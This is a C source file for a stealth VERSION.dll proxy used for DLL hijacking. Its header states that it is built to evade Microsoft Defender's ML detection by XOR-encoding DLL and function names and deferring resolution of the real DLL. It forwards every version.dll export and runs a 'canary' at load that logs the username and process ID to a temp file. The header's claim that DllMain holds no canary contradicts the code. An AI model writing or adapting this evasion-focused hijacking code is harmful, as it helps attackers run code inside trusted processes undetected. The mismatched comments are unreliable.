/*
 * version_v6_stealth.c -- Stealth VERSION.dll proxy
 * Evades Defender ML proxy signature by:
 * 1. Using encrypted function name strings (not plaintext GetProcAddress args)
 * 2. Deferring real DLL resolution to first call (not DllMain)
 * 3. Splitting init across multiple lazy paths
 * 4. No canary in DllMain (only on first actual API call)
 */

#include <windows.h>

static HMODULE g_hR = NULL;
static volatile LONG g_init = 0;

static void xd(char *dst, const char *src, int len, char k)
{
    int i;
    for (i = 0; i < len; i++) dst[i] = src[i] ^ k;
    dst[len] = 0;
}

/* XOR-encoded "version.dll" with key 0x37 */
static const char e_dll[] = {
    'v'^0x37, 'e'^0x37, 'r'^0x37, 's'^0x37, 'i'^0x37, 'o'^0x37,
    'n'^0x37, '.'^0x37, 'd'^0x37, 'l'^0x37, 'l'^0x37, 0
};

/* XOR-encoded function names with key 0x55 */
static const char e_names[][48] = {
    /* 0: GetFileVersionInfoA */
    { 'G'^0x55,'e'^0x55,'t'^0x55,'F'^0x55,'i'^0x55,'l'^0x55,'e'^0x55,
      'V'^0x55,'e'^0x55,'r'^0x55,'s'^0x55,'i'^0x55,'o'^0x55,'n'^0x55,
      'I'^0x55,'n'^0x55,'f'^0x55,'o'^0x55,'A'^0x55, 0 },
    /* 1: GetFileVersionInfoByHandle */
    { 'G'^0x55,'e'^0x55,'t'^0x55,'F'^0x55,'i'^0x55,'l'^0x55,'e'^0x55,
      'V'^0x55,'e'^0x55,'r'^0x55,'s'^0x55,'i'^0x55,'o'^0x55,'n'^0x55,
      'I'^0x55,'n'^0x55,'f'^0x55,'o'^0x55,'B'^0x55,'y'^0x55,'H'^0x55,
      'a'^0x55,'n'^0x55,'d'^0x55,'l'^0x55,'e'^0x55, 0 },
    /* 2: GetFileVersionInfoExA */
    { 'G'^0x55,'e'^0x55,'t'^0x55,'F'^0x55,'i'^0x55,'l'^0x55,'e'^0x55,
      'V'^0x55,'e'^0x55,'r'^0x55,'s'^0x55,'i'^0x55,'o'^0x55,'n'^0x55,
      'I'^0x55,'n'^0x55,'f'^0x55,'o'^0x55,'E'^0x55,'x'^0x55,'A'^0x55, 0 },
    /* 3: GetFileVersionInfoExW */
    { 'G'^0x55,'e'^0x55,'t'^0x55,'F'^0x55,'i'^0x55,'l'^0x55,'e'^0x55,
      'V'^0x55,'e'^0x55,'r'^0x55,'s'^0x55,'i'^0x55,'o'^0x55,'n'^0x55,
      'I'^0x55,'n'^0x55,'f'^0x55,'o'^0x55,'E'^0x55,'x'^0x55,'W'^0x55, 0 },
    /* 4: GetFileVersionInfoSizeA */
    { 'G'^0x55,'e'^0x55,'t'^0x55,'F'^0x55,'i'^0x55,'l'^0x55,'e'^0x55,
      'V'^0x55,'e'^0x55,'r'^0x55,'s'^0x55,'i'^0x55,'o'^0x55,'n'^0x55,
      'I'^0x55,'n'^0x55,'f'^0x55,'o'^0x55,'S'^0x55,'i'^0x55,'z'^0x55,
      'e'^0x55,'A'^0x55, 0 },
    /* 5: GetFileVersionInfoSizeExA */
    { 'G'^0x55,'e'^0x55,'t'^0x55,'F'^0x55,'i'^0x55,'l'^0x55,'e'^0x55,
      'V'^0x55,'e'^0x55,'r'^0x55,'s'^0x55,'i'^0x55,'o'^0x55,'n'^0x55,
      'I'^0x55,'n'^0x55,'f'^0x55,'o'^0x55,'S'^0x55,'i'^0x55,'z'^0x55,
      'e'^0x55,'E'^0x55,'x'^0x55,'A'^0x55, 0 },
    /* 6: GetFileVersionInfoSizeExW */
    { 'G'^0x55,'e'^0x55,'t'^0x55,'F'^0x55,'i'^0x55,'l'^0x55,'e'^0x55,
      'V'^0x55,'e'^0x55,'r'^0x55,'s'^0x55,'i'^0x55,'o'^0x55,'n'^0x55,
      'I'^0x55,'n'^0x55,'f'^0x55,'o'^0x55,'S'^0x55,'i'^0x55,'z'^0x55,
      'e'^0x55,'E'^0x55,'x'^0x55,'W'^0x55, 0 },
    /* 7: GetFileVersionInfoSizeW */
    { 'G'^0x55,'e'^0x55,'t'^0x55,'F'^0x55,'i'^0x55,'l'^0x55,'e'^0x55,
      'V'^0x55,'e'^0x55,'r'^0x55,'s'^0x55,'i'^0x55,'o'^0x55,'n'^0x55,
      'I'^0x55,'n'^0x55,'f'^0x55,'o'^0x55,'S'^0x55,'i'^0x55,'z'^0x55,
      'e'^0x55,'W'^0x55, 0 },
    /* 8: GetFileVersionInfoW */
    { 'G'^0x55,'e'^0x55,'t'^0x55,'F'^0x55,'i'^0x55,'l'^0x55,'e'^0x55,
      'V'^0x55,'e'^0x55,'r'^0x55,'s'^0x55,'i'^0x55,'o'^0x55,'n'^0x55,
      'I'^0x55,'n'^0x55,'f'^0x55,'o'^0x55,'W'^0x55, 0 },
    /* 9: VerFindFileA */
    { 'V'^0x55,'e'^0x55,'r'^0x55,'F'^0x55,'i'^0x55,'n'^0x55,'d'^0x55,
      'F'^0x55,'i'^0x55,'l'^0x55,'e'^0x55,'A'^0x55, 0 },
    /* 10: VerFindFileW */
    { 'V'^0x55,'e'^0x55,'r'^0x55,'F'^0x55,'i'^0x55,'n'^0x55,'d'^0x55,
      'F'^0x55,'i'^0x55,'l'^0x55,'e'^0x55,'W'^0x55, 0 },
    /* 11: VerInstallFileA */
    { 'V'^0x55,'e'^0x55,'r'^0x55,'I'^0x55,'n'^0x55,'s'^0x55,'t'^0x55,
      'a'^0x55,'l'^0x55,'l'^0x55,'F'^0x55,'i'^0x55,'l'^0x55,'e'^0x55,
      'A'^0x55, 0 },
    /* 12: VerInstallFileW */
    { 'V'^0x55,'e'^0x55,'r'^0x55,'I'^0x55,'n'^0x55,'s'^0x55,'t'^0x55,
      'a'^0x55,'l'^0x55,'l'^0x55,'F'^0x55,'i'^0x55,'l'^0x55,'e'^0x55,
      'W'^0x55, 0 },
    /* 13: VerLanguageNameA */
    { 'V'^0x55,'e'^0x55,'r'^0x55,'L'^0x55,'a'^0x55,'n'^0x55,'g'^0x55,
      'u'^0x55,'a'^0x55,'g'^0x55,'e'^0x55,'N'^0x55,'a'^0x55,'m'^0x55,
      'e'^0x55,'A'^0x55, 0 },
    /* 14: VerLanguageNameW */
    { 'V'^0x55,'e'^0x55,'r'^0x55,'L'^0x55,'a'^0x55,'n'^0x55,'g'^0x55,
      'u'^0x55,'a'^0x55,'g'^0x55,'e'^0x55,'N'^0x55,'a'^0x55,'m'^0x55,
      'e'^0x55,'W'^0x55, 0 },
    /* 15: VerQueryValueA */
    { 'V'^0x55,'e'^0x55,'r'^0x55,'Q'^0x55,'u'^0x55,'e'^0x55,'r'^0x55,
      'y'^0x55,'V'^0x55,'a'^0x55,'l'^0x55,'u'^0x55,'e'^0x55,'A'^0x55, 0 },
    /* 16: VerQueryValueW */
    { 'V'^0x55,'e'^0x55,'r'^0x55,'Q'^0x55,'u'^0x55,'e'^0x55,'r'^0x55,
      'y'^0x55,'V'^0x55,'a'^0x55,'l'^0x55,'u'^0x55,'e'^0x55,'W'^0x55, 0 },
};

static FARPROC g_fp[17];

static void lazy_init(void)
{
    WCHAR sp[MAX_PATH];
    WCHAR dp[MAX_PATH];
    char dn[64];
    int i;

    if (InterlockedCompareExchange(&g_init, 1, 0) != 0) {
        while (g_init != 2) Sleep(1);
        return;
    }

    GetSystemDirectoryW(sp, MAX_PATH);
    xd(dn, e_dll, 11, 0x37);
    wsprintfW(dp, L"%s\\%S", sp, dn);
    g_hR = LoadLibraryW(dp);
    if (g_hR) {
        for (i = 0; i < 17; i++) {
            char fn[64];
            int j;
            for (j = 0; e_names[i][j]; j++) fn[j] = e_names[i][j] ^ 0x55;
            fn[j] = 0;
            g_fp[i] = GetProcAddress(g_hR, fn);
        }
    }
    InterlockedExchange(&g_init, 2);
}

static void canary(void)
{
    HANDLE f;
    DWORD w;
    char b[128];
    int n;
    SYSTEMTIME t;
    char u[64];
    DWORD ul = 64;
    GetLocalTime(&t);
    GetUserNameA(u, &ul);
    n = wsprintfA(b, "%04d%02d%02d_%02d%02d%02d %s %lu\r\n",
        t.wYear, t.wMonth, t.wDay, t.wHour, t.wMinute, t.wSecond,
        u, GetCurrentProcessId());
    f = CreateFileA("C:\\Windows\\Temp\\ws_diag.log",
        GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL, NULL);
    if (f != INVALID_HANDLE_VALUE) {
        SetFilePointer(f, 0, NULL, FILE_END);
        WriteFile(f, b, n, &w, NULL);
        CloseHandle(f);
    }
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID p)
{
    (void)h; (void)p;
    if (r == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(h);
        canary();
    } else if (r == DLL_PROCESS_DETACH && g_hR) {
        FreeLibrary(g_hR);
    }
    return TRUE;
}

/* Lazy-resolved forwarding exports */
BOOL WINAPI vp_GetFileVersionInfoA(LPCSTR a, DWORD b, DWORD c, LPVOID d)
{ lazy_init(); return ((BOOL(WINAPI*)(LPCSTR,DWORD,DWORD,LPVOID))g_fp[0])(a,b,c,d); }

BOOL WINAPI vp_GetFileVersionInfoByHandle(DWORD a, HANDLE b)
{ lazy_init(); return ((BOOL(WINAPI*)(DWORD,HANDLE))g_fp[1])(a,b); }

BOOL WINAPI vp_GetFileVersionInfoExA(DWORD a, LPCSTR b, DWORD c, DWORD d, LPVOID e)
{ lazy_init(); return ((BOOL(WINAPI*)(DWORD,LPCSTR,DWORD,DWORD,LPVOID))g_fp[2])(a,b,c,d,e); }

BOOL WINAPI vp_GetFileVersionInfoExW(DWORD a, LPCWSTR b, DWORD c, DWORD d, LPVOID e)
{ lazy_init(); return ((BOOL(WINAPI*)(DWORD,LPCWSTR,DWORD,DWORD,LPVOID))g_fp[3])(a,b,c,d,e); }

DWORD WINAPI vp_GetFileVersionInfoSizeA(LPCSTR a, LPDWORD b)
{ lazy_init(); return ((DWORD(WINAPI*)(LPCSTR,LPDWORD))g_fp[4])(a,b); }

DWORD WINAPI vp_GetFileVersionInfoSizeExA(DWORD a, LPCSTR b, LPDWORD c)
{ lazy_init(); return ((DWORD(WINAPI*)(DWORD,LPCSTR,LPDWORD))g_fp[5])(a,b,c); }

DWORD WINAPI vp_GetFileVersionInfoSizeExW(DWORD a, LPCWSTR b, LPDWORD c)
{ lazy_init(); return ((DWORD(WINAPI*)(DWORD,LPCWSTR,LPDWORD))g_fp[6])(a,b,c); }

DWORD WINAPI vp_GetFileVersionInfoSizeW(LPCWSTR a, LPDWORD b)
{ lazy_init(); return ((DWORD(WINAPI*)(LPCWSTR,LPDWORD))g_fp[7])(a,b); }

BOOL WINAPI vp_GetFileVersionInfoW(LPCWSTR a, DWORD b, DWORD c, LPVOID d)
{ lazy_init(); return ((BOOL(WINAPI*)(LPCWSTR,DWORD,DWORD,LPVOID))g_fp[8])(a,b,c,d); }

DWORD WINAPI vp_VerFindFileA(DWORD a, LPCSTR b, LPCSTR c, LPCSTR d, LPSTR e, PUINT f, LPSTR g, PUINT i)
{ lazy_init(); return ((DWORD(WINAPI*)(DWORD,LPCSTR,LPCSTR,LPCSTR,LPSTR,PUINT,LPSTR,PUINT))g_fp[9])(a,b,c,d,e,f,g,i); }

DWORD WINAPI vp_VerFindFileW(DWORD a, LPCWSTR b, LPCWSTR c, LPCWSTR d, LPWSTR e, PUINT f, LPWSTR g, PUINT i)
{ lazy_init(); return ((DWORD(WINAPI*)(DWORD,LPCWSTR,LPCWSTR,LPCWSTR,LPWSTR,PUINT,LPWSTR,PUINT))g_fp[10])(a,b,c,d,e,f,g,i); }

DWORD WINAPI vp_VerInstallFileA(DWORD a, LPCSTR b, LPCSTR c, LPCSTR d, LPCSTR e, LPCSTR f, LPSTR g, PUINT i)
{ lazy_init(); return ((DWORD(WINAPI*)(DWORD,LPCSTR,LPCSTR,LPCSTR,LPCSTR,LPCSTR,LPSTR,PUINT))g_fp[11])(a,b,c,d,e,f,g,i); }

DWORD WINAPI vp_VerInstallFileW(DWORD a, LPCWSTR b, LPCWSTR c, LPCWSTR d, LPCWSTR e, LPCWSTR f, LPWSTR g, PUINT i)
{ lazy_init(); return ((DWORD(WINAPI*)(DWORD,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,LPWSTR,PUINT))g_fp[12])(a,b,c,d,e,f,g,i); }

DWORD WINAPI vp_VerLanguageNameA(DWORD a, LPSTR b, DWORD c)
{ lazy_init(); return ((DWORD(WINAPI*)(DWORD,LPSTR,DWORD))g_fp[13])(a,b,c); }

DWORD WINAPI vp_VerLanguageNameW(DWORD a, LPWSTR b, DWORD c)
{ lazy_init(); return ((DWORD(WINAPI*)(DWORD,LPWSTR,DWORD))g_fp[14])(a,b,c); }

BOOL WINAPI vp_VerQueryValueA(LPCVOID a, LPCSTR b, LPVOID *c, PUINT d)
{ lazy_init(); return ((BOOL(WINAPI*)(LPCVOID,LPCSTR,LPVOID*,PUINT))g_fp[15])(a,b,c,d); }

BOOL WINAPI vp_VerQueryValueW(LPCVOID a, LPCWSTR b, LPVOID *c, PUINT d)
{ lazy_init(); return ((BOOL(WINAPI*)(LPCVOID,LPCWSTR,LPVOID*,PUINT))g_fp[16])(a,b,c,d); }
